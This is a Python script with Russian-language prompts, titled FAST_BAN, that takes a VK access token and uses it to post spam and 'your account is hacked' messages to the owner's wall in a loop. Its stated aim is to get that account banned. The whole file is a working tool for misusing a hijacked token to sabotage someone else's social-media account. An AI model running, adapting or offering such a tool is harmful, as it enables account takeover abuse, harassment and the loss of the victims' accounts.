import requests
import vk_api
import os
import time
from colorama import Fore, Back, Style
def fastban():
    os.system("clear")
    intro = """  
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒    
    ▒▒▐▐▐▐▐▐▐▐▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▐▐▒▒▒▐▐▒▒
    ▒▒▐▐▐▐▐▐▒▒▐▐▐▐▐▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▐▐▒▒▐▐▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▐▐▒▒▒▐▐▒▒▐▐▒▐▐▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▒▒▐▐▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒                                           ▒▒
    ▒▒ FAST_BAN DEVOLOPER DARK KODING            ▒▒
    ▒▒ TELEGRAM: @affonsy    CHANNEL @darkkoding ▒▒
    ▒▒ Beta version                              ▒▒
    ▒▒                                           ▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    """
    print(Fore.RED + intro)
    print(Fore.WHITE + """
    ПРОГРАММА ДЛЯ БАНА АККАУНТА ВК ПО ТОКЕНУ
    1.ВЫБЕРИ ЦЫФРУ ИЗ МЕНЮ И ВВЕДИ 
    2.ВВЕДИ ТОКЕН В ПОЛЕ ДЛЯ ВВОДА
    ВНИМАНИЕ! ТОКЕН ДОЛЖЕН БЫТЬ ВАЛИДНЫЙ!
    +---------------------------------------------+
    |   1.BAN1                                    |
    |   2.BAN2                                    |
    +---------------------------------------------+
    """)
    a = input("[Enter number] -> ")
    if a == "1":
        tok = input("[ACCESS-TOKEN] -> ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        for var in range(10):
            time.sleep(2)
            vk.wall.post(message='vkbot.ru')
            vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
        fastban()
    if a == "2":
        tok = input("[ACCESS-TOKEN] -> ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        for var in range(10):
            time.sleep(2)
            vk.wall.post(message='Сова никогда не спит')
            vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
        print(Fore.BLACK + Back.WHITE + " ")
        fastban()
    else:
        fastban() 
fastban()
